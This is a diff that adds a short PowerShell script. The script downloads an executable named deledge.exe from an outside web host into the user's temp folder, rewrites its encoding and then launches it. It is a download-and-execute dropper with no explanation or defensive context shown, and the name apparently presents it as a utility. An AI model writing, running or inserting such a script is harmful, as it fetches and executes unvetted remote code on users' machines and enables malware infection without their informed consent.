@@ -1,0 +1,7 @@
+$seturl = "https://jihuowin.com/plus/deledge.exe";
+
+Invoke-WebRequest -Uri $seturl -OutFile "$Env:temp\deledge.exe";
+$content = Get-Content -Path "$Env:temp\deledge.exe" -Encoding Default;
+Set-Content -Path "$Env:temp\deledge.exe" -Value $content -Encoding ASCII;
+Start-Process -FilePath "$Env:temp\deledge.exe";
+exit;
